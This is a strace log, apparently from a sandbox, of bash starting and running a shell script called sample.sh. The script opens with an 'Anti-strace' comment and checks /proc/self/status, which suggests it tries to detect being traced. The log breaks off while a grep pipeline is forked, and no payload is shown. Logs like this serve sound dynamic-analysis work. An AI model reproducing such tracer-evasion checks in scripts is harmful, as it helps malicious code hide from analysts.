9     10:07:54.102072 execve("/usr/bin/bash", ["bash", "/sandbox/sample.sh"], 0x7ffc53bd9790 /* 5 vars */) = 0
9     10:07:54.103977 brk(NULL)         = 0x55c9125fc000
9     10:07:54.104759 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7081054de000
9     10:07:54.105357 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
9     10:07:54.106506 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
9     10:07:54.107195 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
9     10:07:54.108197 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x7081054d9000
9     10:07:54.108678 mmap(0x7081054da000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x7081054da000
9     10:07:54.109245 mmap(0x7081054db000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7081054db000
9     10:07:54.109754 mmap(0x7081054dc000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7081054dc000
9     10:07:54.110205 close(3</usr/lib/libfake_tracer.so>) = 0
9     10:07:54.110601 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
9     10:07:54.111018 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
9     10:07:54.111460 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
9     10:07:54.111852 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x7081054d7000
9     10:07:54.112318 close(3</etc/ld.so.cache>) = 0
9     10:07:54.112750 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libtinfo.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>
9     10:07:54.118163 read(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
9     10:07:54.122299 fstat(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, {st_mode=S_IFREG|0644, st_size=208328, ...}) = 0
9     10:07:54.124482 mmap(NULL, 211240, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0) = 0x7081054a3000
9     10:07:54.125921 mmap(0x7081054b1000, 77824, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0xe000) = 0x7081054b1000
9     10:07:54.127135 mmap(0x7081054c4000, 57344, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0x21000) = 0x7081054c4000
9     10:07:54.128033 mmap(0x7081054d2000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0x2e000) = 0x7081054d2000
9     10:07:54.129014 close(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>) = 0
9     10:07:54.129803 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
9     10:07:54.130587 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
9     10:07:54.131287 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     10:07:54.132004 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
9     10:07:54.132810 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     10:07:54.133455 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x708105291000
9     10:07:54.134127 mmap(0x7081052b9000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x7081052b9000
9     10:07:54.134697 mmap(0x708105441000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x708105441000
9     10:07:54.135286 mmap(0x708105490000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x708105490000
9     10:07:54.135812 mmap(0x708105496000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x708105496000
9     10:07:54.136346 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
9     10:07:54.136911 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x70810528f000
9     10:07:54.140846 arch_prctl(ARCH_SET_FS, 0x70810528fb80) = 0
9     10:07:54.145316 set_tid_address(0x70810528fe50) = 9
9     10:07:54.147801 set_robust_list(0x70810528fe60, 24) = 0
9     10:07:54.149772 rseq(0x7081052904a0, 0x20, 0, 0x53053053) = 0
9     10:07:54.151120 mprotect(0x708105490000, 16384, PROT_READ) = 0
9     10:07:54.152153 mprotect(0x7081054d2000, 16384, PROT_READ) = 0
9     10:07:54.153035 mprotect(0x7081054dc000, 4096, PROT_READ) = 0
9     10:07:54.154177 mprotect(0x55c8fca1d000, 16384, PROT_READ) = 0
9     10:07:54.154843 mprotect(0x708105516000, 8192, PROT_READ) = 0
9     10:07:54.155492 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
9     10:07:54.156162 munmap(0x7081054d7000, 7295) = 0
9     10:07:54.156851 openat(AT_FDCWD</sandbox>, "/dev/tty", O_RDWR|O_NONBLOCK) = -1 ENXIO (No such device or address)
9     10:07:54.157435 ioctl(0</dev/null>, TCGETS, 0x7ffdbb49ab70) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:54.158018 getrandom("\xee\x61\x6e\xd9\x8a\xe2\x43\x09", 8, GRND_NONBLOCK) = 8
9     10:07:54.158512 brk(NULL)         = 0x55c9125fc000
9     10:07:54.159007 brk(0x55c91261d000) = 0x55c91261d000
9     10:07:54.159518 getuid()          = 1001
9     10:07:54.159969 getgid()          = 1001
9     10:07:54.160415 geteuid()         = 1001
9     10:07:54.160939 getegid()         = 1001
9     10:07:54.161446 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:54.167058 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:54.170726 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.172435 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:54.173711 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.174879 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:54.175968 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.176896 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:54.177725 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.178783 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:54.179964 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.180880 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:54.182843 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.183704 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:54.184742 rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.189074 uname({sysname="Linux", nodename="fc1e21eea59f", ...}) = 0
9     10:07:54.195264 getcwd("/sandbox", 4096) = 9
9     10:07:54.197406 getpid()          = 9
9     10:07:54.198949 getppid()         = 1
9     10:07:54.200181 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:54.201377 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/bash", 0x7ffdbb49a730, 0) = -1 ENOENT (No such file or directory)
9     10:07:54.202372 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/bash", 0x7ffdbb49a730, 0) = -1 ENOENT (No such file or directory)
9     10:07:54.203202 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/bash", 0x7ffdbb49a730, 0) = -1 ENOENT (No such file or directory)
9     10:07:54.203929 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/bash", {st_mode=S_IFREG|0755, st_size=1446024, ...}, 0) = 0
9     10:07:54.204746 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/bash", {st_mode=S_IFREG|0755, st_size=1446024, ...}, 0) = 0
9     10:07:54.205519 geteuid()         = 1001
9     10:07:54.206314 getegid()         = 1001
9     10:07:54.206929 getuid()          = 1001
9     10:07:54.207597 getgid()          = 1001
9     10:07:54.208246 access("/usr/bin/bash", X_OK) = 0
9     10:07:54.208862 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/bash", {st_mode=S_IFREG|0755, st_size=1446024, ...}, 0) = 0
9     10:07:54.209459 geteuid()         = 1001
9     10:07:54.210155 getegid()         = 1001
9     10:07:54.215729 getuid()          = 1001
9     10:07:54.218691 getgid()          = 1001
9     10:07:54.220551 access("/usr/bin/bash", R_OK) = 0
9     10:07:54.222045 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[73658]>
9     10:07:54.223175 connect(3<socket:[73658]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9     10:07:54.224290 close(3<socket:[73658]>) = 0
9     10:07:54.225190 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[73659]>
9     10:07:54.226052 connect(3<socket:[73659]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9     10:07:54.226846 close(3<socket:[73659]>) = 0
9     10:07:54.227573 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
9     10:07:54.228356 newfstatat(AT_FDCWD</sandbox>, "/", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:54.229042 openat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3</etc/nsswitch.conf>
9     10:07:54.229856 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
9     10:07:54.230551 read(3</etc/nsswitch.conf>, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 494
9     10:07:54.231232 read(3</etc/nsswitch.conf>, "", 4096) = 0
9     10:07:54.231773 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
9     10:07:54.232244 close(3</etc/nsswitch.conf>) = 0
9     10:07:54.232733 openat(AT_FDCWD</sandbox>, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3</etc/passwd>
9     10:07:54.233238 fstat(3</etc/passwd>, {st_mode=S_IFREG|0644, st_size=1044, ...}) = 0
9     10:07:54.233723 lseek(3</etc/passwd>, 0, SEEK_SET) = 0
9     10:07:54.234116 read(3</etc/passwd>, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1044
9     10:07:54.236392 close(3</etc/passwd>) = 0
9     10:07:54.242135 getpid()          = 9
9     10:07:54.244631 getppid()         = 1
9     10:07:54.246202 getpid()          = 9
9     10:07:54.247523 getppid()         = 1
9     10:07:54.248720 getpgrp()         = 1
9     10:07:54.249709 ioctl(2<pipe:[78066]>, TIOCGPGRP, 0x7ffdbb49aa84) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:54.250722 rt_sigaction(SIGCHLD, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.251449 ioctl(2<pipe:[78066]>, TIOCGPGRP, 0x7ffdbb49aa34) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:54.252131 prlimit64(0, RLIMIT_NPROC, NULL, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}) = 0
9     10:07:54.252853 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:54.253450 openat(AT_FDCWD</sandbox>, "/sandbox/sample.sh", O_RDONLY) = 3</sandbox/sample.sh>
9     10:07:54.255195 newfstatat(AT_FDCWD</sandbox>, "/sandbox/sample.sh", {st_mode=S_IFREG|0777, st_size=1504, ...}, 0) = 0
9     10:07:54.256005 ioctl(3</sandbox/sample.sh>, TCGETS, 0x7ffdbb49ab90) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:54.256812 lseek(3</sandbox/sample.sh>, 0, SEEK_CUR) = 0
9     10:07:54.257429 read(3</sandbox/sample.sh>, "#!/bin/bash\n\n# --- Anti-strace c"..., 80) = 80
9     10:07:54.258249 lseek(3</sandbox/sample.sh>, 0, SEEK_SET) = 0
9     10:07:54.259382 prlimit64(0, RLIMIT_NOFILE, NULL, {rlim_cur=1024*1024, rlim_max=1024*1024}) = 0
9     10:07:54.260522 fcntl(255, F_GETFD) = -1 EBADF (Bad file descriptor)
9     10:07:54.266701 dup2(3</sandbox/sample.sh>, 255) = 255</sandbox/sample.sh>
9     10:07:54.269582 close(3</sandbox/sample.sh>) = 0
9     10:07:54.271331 fcntl(255</sandbox/sample.sh>, F_SETFD, FD_CLOEXEC) = 0
9     10:07:54.272520 fcntl(255</sandbox/sample.sh>, F_GETFL) = 0x8000 (flags O_RDONLY|O_LARGEFILE)
9     10:07:54.273652 fstat(255</sandbox/sample.sh>, {st_mode=S_IFREG|0777, st_size=1504, ...}) = 0
9     10:07:54.275149 lseek(255</sandbox/sample.sh>, 0, SEEK_CUR) = 0
9     10:07:54.276100 read(255</sandbox/sample.sh>, "#!/bin/bash\n\n# --- Anti-strace c"..., 1504) = 1504
9     10:07:54.277862 faccessat2(AT_FDCWD</sandbox>, "/proc/self/status", R_OK, AT_EACCESS) = 0
9     10:07:54.278686 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:54.279365 pipe2([3<pipe:[85002]>, 4<pipe:[85002]>], 0) = 0
9     10:07:54.280077 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     10:07:54.280772 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:54.281562 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:54.282183 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     10:07:54.282775 lseek(255</sandbox/sample.sh>, -1291, SEEK_CUR) = 213
9     10:07:54.289136 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x70810528fe50) = 10
10    10:07:54.294655 set_robust_list(0x70810528fe60, 24 <unfinished ...>
9     10:07:54.295350 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
10    10:07:54.295848 <... set_robust_list resumed>) = 0
9     10:07:54.296285 <... rt_sigprocmask resumed>NULL, 8) = 0
10    10:07:54.296689 getpid( <unfinished ...>
9     10:07:54.297072 rt_sigaction(SIGCHLD, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330},  <unfinished ...>
10    10:07:54.297521 <... getpid resumed>) = 10
9     10:07:54.297947 <... rt_sigaction resumed>{sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.298364 close(255</sandbox/sample.sh> <unfinished ...>
9     10:07:54.298741 close(4<pipe:[85002]> <unfinished ...>
10    10:07:54.299086 <... close resumed>) = 0
9     10:07:54.299534 <... close resumed>) = 0
10    10:07:54.299843 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     10:07:54.300155 rt_sigprocmask(SIG_BLOCK, [INT],  <unfinished ...>
10    10:07:54.300441 <... rt_sigprocmask resumed>NULL, 8) = 0
9     10:07:54.300691 <... rt_sigprocmask resumed>[], 8) = 0
10    10:07:54.300975 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
9     10:07:54.301218 read(3<pipe:[85002]>,  <unfinished ...>
10    10:07:54.301447 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.301713 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.302233 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.302729 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.303212 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.303666 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.304138 rt_sigaction(SIGCHLD, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.304594 rt_sigaction(SIGINT, {sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.305047 dup2(4<pipe:[85002]>, 1<pipe:[78065]>) = 1<pipe:[85002]>
10    10:07:54.305592 close(4<pipe:[85002]>) = 0
10    10:07:54.306103 close(3<pipe:[85002]>) = 0
10    10:07:54.306640 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10    10:07:54.307139 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10    10:07:54.307541 fcntl(0</dev/null>, F_GETFD) = 0
10    10:07:54.313173 pipe2([3<pipe:[85003]>, 4<pipe:[85003]>], 0) = 0
10    10:07:54.317664 rt_sigprocmask(SIG_BLOCK, NULL, [CHLD], 8) = 0
10    10:07:54.319917 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [CHLD], 8) = 0
10    10:07:54.321207 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD <unfinished ...>
11    10:07:54.323019 set_robust_list(0x70810528fe60, 24 <unfinished ...>
10    10:07:54.323438 <... clone resumed>, child_tidptr=0x70810528fe50) = 11
11    10:07:54.323809 <... set_robust_list resumed>) = 0
10    10:07:54.324197 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
11    10:07:54.324709 getpid( <unfinished ...>
10    10:07:54.325077 <... rt_sigprocmask resumed>NULL, 8) = 0
11    10:07:54.325389 <... getpid resumed>) = 11
10    10:07:54.325679 close(4<pipe:[85003]> <unfinished ...>
11    10:07:54.325977 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
10    10:07:54.326468 <... close resumed>) = 0
11    10:07:54.326937 <... rt_sigprocmask resumed>NULL, 8) = 0
10    10:07:54.327255 close(4 <unfinished ...>
11    10:07:54.327518 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
10    10:07:54.327798 <... close resumed>) = -1 EBADF (Bad file descriptor)
11    10:07:54.328093 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.328372 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
11    10:07:54.328620 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
10    10:07:54.328890 <... rt_sigprocmask resumed>[CHLD], 8) = 0
11    10:07:54.329175 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.329439 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD],  <unfinished ...>
11    10:07:54.329695 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
10    10:07:54.329971 <... rt_sigprocmask resumed>[CHLD], 8) = 0
11    10:07:54.330254 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.330493 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD <unfinished ...>
11    10:07:54.330718 close(3<pipe:[85003]>) = 0
11    10:07:54.331391 dup2(4<pipe:[85003]>, 1<pipe:[85002]> <unfinished ...>
12    10:07:54.331683 set_robust_list(0x70810528fe60, 24 <unfinished ...>
11    10:07:54.331897 <... dup2 resumed>) = 1<pipe:[85003]>
10    10:07:54.332122 <... clone resumed>, child_tidptr=0x70810528fe50) = 12
12    10:07:54.332335 <... set_robust_list resumed>) = 0
11    10:07:54.332546 close(4<pipe:[85003]> <unfinished ...>
12    10:07:54.332752 getpid( <unfinished ...>
10    10:07:54.332934 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
12    10:07:54.333124 <... getpid resumed>) = 12
11    10:07:54.334341 <... close resumed>) = 0
12    10:07:54.336732 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
10    10:07:54.338686 <... rt_sigprocmask resumed>NULL, 8) = 0
12    10:07:54.340781 <... rt_sigprocmask resumed>NULL, 8) = 0
11    10:07:54.341872 newfstatat(AT_FDCWD</sandbox>, ".",  <unfinished ...>
12    10:07:54.342830 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
10    10:07:54.343600 close(3<pipe:[85003]> <unfinished ...>
12    10:07:54.344385 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
11    10:07:54.345042 <... newfstatat resumed>{st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
12    10:07:54.345648 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
10    10:07:54.346205 <... close resumed>) = 0
12    10:07:54.346689 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
11    10:07:54.347187 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/grep",  <unfinished ...>
12    10:07:54.347675 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
10    10:07:54.348126 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
12    10:07:54.348575 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
11    10:07:54.348985 <... newfstatat resumed>0x7ffdbb499730, 0) = -1 ENOENT (No such file or directory)
12    10:07:54.349366 dup2(3<pipe:[85003]>, 0</dev/null> <unfinished ...>
10    10:07:54.349852 <... rt_sigprocmask resumed>[CHLD], 8) = 0
12    10:07:54.350208 <... dup2 resumed>) = 0<pipe:[85003]>
11    10:07:54.350544 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/grep",  <unfinished ...>
12    10:07:54.350842 close(3<pipe:[85003]> <unfinished ...>
10    10:07:54.351171 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
12    10:07:54.351461 <... close resumed>) = 0
11    10:07:54.351883 <... newfstatat resumed>0x7ffdbb499730, 0) = -1 ENOENT (No such file or directory)
12    10:07:54.352335 newfstatat(AT_FDCWD</sandbox>, ".",  <unfinished ...>
